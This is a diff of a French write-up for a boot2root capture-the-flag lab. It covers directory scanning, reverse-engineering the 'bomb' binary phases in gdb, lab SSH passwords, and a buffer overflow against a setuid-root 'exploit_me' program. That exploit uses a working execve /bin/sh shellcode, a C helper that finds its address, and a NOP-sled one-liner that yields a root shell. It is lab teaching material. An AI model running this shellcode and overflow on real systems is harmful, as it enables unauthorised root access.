@@ -1,3 +1,5 @@
+% writeup1 boot2roo
+
 # Writeup1
 
 ## Pré-requis
@@ -58,7 +60,7 @@ Afin d'avoir une idée plus précise de l'architecture du site, nous utilisons l
 
 Nous lançons le programme dirb qui prends deux arguments :
 
-```
+```bash
 $> ./dirb https://192.168.85.136/ dirb222/wordlists/common.txt
 [...]
 ---- Scanning URL: https://192.168.85.136/ ----
@@ -263,15 +265,157 @@ Nous avons donc une comparaison avec une _string_ qui ressemble à "Public speak
 
 En observant `<phase_2>` avec `objdump -d bomb`, nous notons un appel à la fonction `<read_six_numbers>`. Cette fonction vérifie que l'entrée correspond à 6 _integers_ séparés par des espaces.
 
-Dans `gdb`, nous pouvons donc fixer un _breakpoint_ sur `<phase_2>` et puis faire un `disas` qui va nous afficher le code assembleur de la fonction.
+Dans `gdb`, nous pouvons donc fixer un _breakpoint_ sur `<phase_2>` et puis faire un `disas` qui va nous afficher le code assembleur de la fonction :
 
-`1 2 6 24 120 720`
+```
+Dump of assembler code for function phase_2:
+   0x08048b48 <+0>:	push   %ebp
+   0x08048b49 <+1>:	mov    %esp,%ebp
+   0x08048b4b <+3>:	sub    $0x20,%esp
+   0x08048b4e <+6>:	push   %esi
+   0x08048b4f <+7>:	push   %ebx
+   0x08048b50 <+8>:	mov    0x8(%ebp),%edx
+   0x08048b53 <+11>:	add    $0xfffffff8,%esp
+   0x08048b56 <+14>:	lea    -0x18(%ebp),%eax
+   0x08048b59 <+17>:	push   %eax
+   0x08048b5a <+18>:	push   %edx
+   0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>
+   0x08048b60 <+24>:	add    $0x10,%esp
+   0x08048b63 <+27>:	cmpl   $0x1,-0x18(%ebp)
+   0x08048b67 <+31>:	je     0x8048b6e <phase_2+38>
+   0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
+   0x08048b6e <+38>:	mov    $0x1,%ebx
+   0x08048b73 <+43>:	lea    -0x18(%ebp),%esi
+   0x08048b76 <+46>:	lea    0x1(%ebx),%eax
+   0x08048b79 <+49>:	imul   -0x4(%esi,%ebx,4),%eax
+   0x08048b7e <+54>:	cmp    %eax,(%esi,%ebx,4)
+   0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>
+   0x08048b83 <+59>:	call   0x80494fc <explode_bomb>
+   0x08048b88 <+64>:	inc    %ebx
+   0x08048b89 <+65>:	cmp    $0x5,%ebx
+   0x08048b8c <+68>:	jle    0x8048b76 <phase_2+46>
+   0x08048b8e <+70>:	lea    -0x28(%ebp),%esp
+   0x08048b91 <+73>:	pop    %ebx
+   0x08048b92 <+74>:	pop    %esi
+   0x08048b93 <+75>:	mov    %ebp,%esp
+   0x08048b95 <+77>:	pop    %ebp
+   0x08048b96 <+78>:	ret
+End of assembler dump.
+```
+
+Nous constatons qu'il y a deux appels à `<explode_bomb>`. Le premier se fait après une comparaison (`cmpl`) entre la valeur à l'adresse `%ebp - 0x18` et la valeur fixe `$0x1`. Cela veut dire que c'est une comparaison à `1` ! Nous avons notre premier nombre.
+
+__A EXPLIQUER !__
+
+Nous pouvons en déduire que la suite que nous avons sous les yeux est une suite de nombres factoriels :
+
+```
+1! = 1
+2! = 1 * 2 = 2
+3! = 1 * 2 * 3 = 6
+4! = 1 * 2 * 3 * 4 = 24
+5! = 1 * 2 * 3 * 4 * 5 = 120
+6! = 1 * 2 * 3 * 4 * 5 * 6 = 720
+```
+
+Nous avons donc la suite suivante en mot de passe pour `phase_2` : `1 2 6 24 120 720`.
 
 ### 3ème étape
+
+Voici un _dump_ de `phase_3` :
+
+```
+Dump of assembler code for function phase_3:
+   0x08048b98 <+0>:	push   %ebp
+   0x08048b99 <+1>:	mov    %esp,%ebp
+   0x08048b9b <+3>:	sub    $0x14,%esp
+   0x08048b9e <+6>:	push   %ebx
+   0x08048b9f <+7>:	mov    0x8(%ebp),%edx
+   0x08048ba2 <+10>:	add    $0xfffffff4,%esp
+   0x08048ba5 <+13>:	lea    -0x4(%ebp),%eax
+   0x08048ba8 <+16>:	push   %eax
+   0x08048ba9 <+17>:	lea    -0x5(%ebp),%eax
+   0x08048bac <+20>:	push   %eax
+   0x08048bad <+21>:	lea    -0xc(%ebp),%eax
+   0x08048bb0 <+24>:	push   %eax
+   0x08048bb1 <+25>:	push   $0x80497de
+   0x08048bb6 <+30>:	push   %edx
+   0x08048bb7 <+31>:	call   0x8048860 <sscanf@plt>
+   0x08048bbc <+36>:	add    $0x20,%esp
+   0x08048bbf <+39>:	cmp    $0x2,%eax
+   0x08048bc2 <+42>:	jg     0x8048bc9 <phase_3+49>
+   0x08048bc4 <+44>:	call   0x80494fc <explode_bomb>
+   0x08048bc9 <+49>:	cmpl   $0x7,-0xc(%ebp)
+   0x08048bcd <+53>:	ja     0x8048c88 <phase_3+240>
+   0x08048bd3 <+59>:	mov    -0xc(%ebp),%eax
+   0x08048bd6 <+62>:	jmp    *0x80497e8(,%eax,4)
+   0x08048bdd <+69>:	lea    0x0(%esi),%esi
+   0x08048be0 <+72>:	mov    $0x71,%bl
+   0x08048be2 <+74>:	cmpl   $0x309,-0x4(%ebp)
+   0x08048be9 <+81>:	je     0x8048c8f <phase_3+247>
+   0x08048bef <+87>:	call   0x80494fc <explode_bomb>
+   0x08048bf4 <+92>:	jmp    0x8048c8f <phase_3+247>
+   0x08048bf9 <+97>:	lea    0x0(%esi,%eiz,1),%esi
+   0x08048c00 <+104>:	mov    $0x62,%bl
+   0x08048c02 <+106>:	cmpl   $0xd6,-0x4(%ebp)
+   0x08048c09 <+113>:	je     0x8048c8f <phase_3+247>
+   0x08048c0f <+119>:	call   0x80494fc <explode_bomb>
+   0x08048c14 <+124>:	jmp    0x8048c8f <phase_3+247>
+   0x08048c16 <+126>:	mov    $0x62,%bl
+   0x08048c18 <+128>:	cmpl   $0x2f3,-0x4(%ebp)
+   0x08048c1f <+135>:	je     0x8048c8f <phase_3+247>
+   0x08048c21 <+137>:	call   0x80494fc <explode_bomb>
+   0x08048c26 <+142>:	jmp    0x8048c8f <phase_3+247>
+   0x08048c28 <+144>:	mov    $0x6b,%bl
+   0x08048c2a <+146>:	cmpl   $0xfb,-0x4(%ebp)
+   0x08048c31 <+153>:	je     0x8048c8f <phase_3+247>
+   0x08048c33 <+155>:	call   0x80494fc <explode_bomb>
+   0x08048c38 <+160>:	jmp    0x8048c8f <phase_3+247>
+   0x08048c3a <+162>:	lea    0x0(%esi),%esi
+   0x08048c40 <+168>:	mov    $0x6f,%bl
+   0x08048c42 <+170>:	cmpl   $0xa0,-0x4(%ebp)
+   0x08048c49 <+177>:	je     0x8048c8f <phase_3+247>
+   0x08048c4b <+179>:	call   0x80494fc <explode_bomb>
+   0x08048c50 <+184>:	jmp    0x8048c8f <phase_3+247>
+   0x08048c52 <+186>:	mov    $0x74,%bl
+   0x08048c54 <+188>:	cmpl   $0x1ca,-0x4(%ebp)
+   0x08048c5b <+195>:	je     0x8048c8f <phase_3+247>
+   0x08048c5d <+197>:	call   0x80494fc <explode_bomb>
+   0x08048c62 <+202>:	jmp    0x8048c8f <phase_3+247>
+   0x08048c64 <+204>:	mov    $0x76,%bl
+   0x08048c66 <+206>:	cmpl   $0x30c,-0x4(%ebp)
+   0x08048c6d <+213>:	je     0x8048c8f <phase_3+247>
+   0x08048c6f <+215>:	call   0x80494fc <explode_bomb>
+   0x08048c74 <+220>:	jmp    0x8048c8f <phase_3+247>
+   0x08048c76 <+222>:	mov    $0x62,%bl
+   0x08048c78 <+224>:	cmpl   $0x20c,-0x4(%ebp)
+   0x08048c7f <+231>:	je     0x8048c8f <phase_3+247>
+   0x08048c81 <+233>:	call   0x80494fc <explode_bomb>
+   0x08048c86 <+238>:	jmp    0x8048c8f <phase_3+247>
+   0x08048c88 <+240>:	mov    $0x78,%bl
+   0x08048c8a <+242>:	call   0x80494fc <explode_bomb>
+   0x08048c8f <+247>:	cmp    -0x5(%ebp),%bl
+   0x08048c92 <+250>:	je     0x8048c99 <phase_3+257>
+   0x08048c94 <+252>:	call   0x80494fc <explode_bomb>
+   0x08048c99 <+257>:	mov    -0x18(%ebp),%ebx
+   0x08048c9c <+260>:	mov    %ebp,%esp
+   0x08048c9e <+262>:	pop    %ebp
+   0x08048c9f <+263>:	ret
+End of assembler dump.
+```
+
+Nous pouvons constater un appel à `sscanf` ce qui est intéressant car elle prend en argument un _input string_ et un _format string_. Le _format string_ se trouve dans le registre `edx` et l'_input string_ ressemble à cela :
+
+```
+(gdb) x/s 0x80497de
+0x80497de:	 "%d %c %d"
+```
 
 `1 b 214`
 
 ### 4ème étape
+
+Suite de Fibonacci.
 
 `9`
 
@@ -283,22 +427,51 @@ Dans `gdb`, nous pouvons donc fixer un _breakpoint_ sur `<phase_2>` et puis fair
 
 `4 2 6 3 1 5`
 
-Bravo ! Nous pou
+Bravo ! Nous pouvons nous connecter en ssh avec le login : `thor` et le password : `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 
-On se connecte en ssh avec le login : `thor` et password : `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+## turtle
 
-Un fichier `turtle` contenant des mouvements à faire, est présent.
-On regarde sur internet `turlte python` => https://docs.python.org/2/library/turtle.html
-On a fait un script `turtle.py` qui va import la lib `turlte` et faire les mouvements up, down, left, right
-Le tracé se fait tout seul et il est affiché `slash`, on le hache en `md5`
+Un fichier `turtle` va nous permettre d'obtenir le mot de passe pour accéder à la session de `zaz`.
 
-On se connecte en ssh avec login : `zaz` et password : `646da671ca01bb5d84dbb5fb2238dc8e`
-Un executable `exploit_me` est présent à la racine. Il faut faire du `buffer_overflow` pour cette partie
-Du coup on fait un `export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'`
-Ce qui correspond à l'ouverture d'un shell en `shellcode`
-Un programme en C nous indique ou se trouve le shellcode en mémoire
+Ce fichier contient des instructions de déplacement. Les utilisateurs de Python reconnaîtront les méthodes de la bibliothèque [Turtle](https://docs.python.org/3.0/library/turtle.html). En nettoyant le fichier et en appliquant le script `turtle.py` que nous avons créé, vous obtenez une inscription : `SLASH`.
+
+En hashant ce résultat, nous obtenons : `646da671ca01bb5d84dbb5fb2238dc8e` pour le mot de passe de `zaz`.
+
+## exploit_me
+
+Un exécutable `exploit_me` est présent à la racine. Nous allons utiliser la technique du _buffer overflow_ pour cette partie car le _owner_ est _root_.
+
+Rentrez directement dans le shell :
+
+```bash
+$> export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
+```
+
+Ce qui correspond à l'ouverture d'un shell en `shellcode`.
+
+Le programme suivant est à copier/coller, à compiler et exécuter. Il renvoit l'adresse à laquelle se trouve la variable d'environnement `SHELLCODE` (que nous avons donc modifié précédemment).
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char **argv)
+{
+    char* ptr = getenv("SHELLCODE");
+    printf("%p\n", ptr);
+}
+```
+
+> Le fichier est aussi disponible dans `scripts/ressources/buffer_overflow.c`.
+
+Nous pouvons exécuter la ligne suivante qui va démarrer le fichier `exploit_me` où `SHELLCODE` est l'adresse de la variable d'environnement `$SHELLCODE` en inversant l'endian (par exemple `0xbffff8f8` devient `\xf8\xf8\xff\xbf`).
+
+```bash
 ./exploit_me `python -c 'print "\x90" * 140 + "SHELLCODE"'`
-On ecrit `\x90` sur 140 octets (ce qui corresponds a un NOP, cela passe a l'octet suivant) puis le shellcode.
+```
+
+Nous écrivons donc `\x90` sur 140 octets (qui correspond à un `NOP`, cela passe à l'octet suivant) puis nous passons au `shellcode`.
+
 Le programme va lire le shellcode et ouvrir un nouveau shell en root car l'user qui a crée `./exploit_me` est `root`.
 
-# Yes we dit it !
+__Bravo ! Vous êtes root !__
